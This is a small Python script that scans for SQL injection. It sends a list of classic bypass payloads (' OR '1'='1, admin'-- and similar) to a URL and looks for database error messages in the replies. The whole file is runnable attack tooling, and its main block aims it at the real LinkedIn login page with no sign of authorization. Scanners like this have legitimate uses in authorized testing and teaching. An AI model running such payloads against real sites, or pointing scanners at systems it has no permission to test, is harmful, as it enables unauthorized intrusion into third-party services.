import requests
from termcolor import colored

sql_payloads = [
    "' OR '1'='1",
    "' OR '1'='1'--",
    "' OR 1=1 --",
    "\" OR 1=1 --",
    "' OR 'a'='a",
    "' OR 1=1#",
    "' OR 1=1/*",
    "' OR ''='",
    "admin'--",
    "' OR 1=1 LIMIT 1 OFFSET 0 --"
]

def test_sql_injection(url):
    vulnerable = False
    for payload in sql_payloads:
        test_url = f"{url}{payload}"
        print(colored(f"[*] Testing URL: {test_url}", "yellow"))

        try:
            response = requests.get(test_url)
            if is_vulnerable(response):
                print(colored(f"[+] SQL Injection detected with payload: {payload}", "green"))
                vulnerable = True
                break
        except requests.exceptions.RequestException as e:
            print(colored(f"[!] Error connecting to {test_url}: {str(e)}", "red"))
            continue

    if not vulnerable:
        print(colored("[*] No SQL injection vulnerability found.", "red"))


def is_vulnerable(response):
    error_messages = [
        "you have an error in your SQL syntax",
        "Warning: mysql_fetch_array()",
        "Unclosed quotation mark after the character string",
        "SQL syntax",
        "mysql_num_rows()",
        "ORA-00933", 
        "pg_query() [<a href='function.pg-query'>function.pg-query</a>]: Query failed",
    ]
    
    for error_message in error_messages:
        if error_message.lower() in response.text.lower():
            return True
    return False


if __name__ == "__main__":
    url = "https://www.linkedin.com/login/ar?fromSignIn=true&trk=guest_homepage-basic_nav-header-signin"
    test_sql_injection(url)
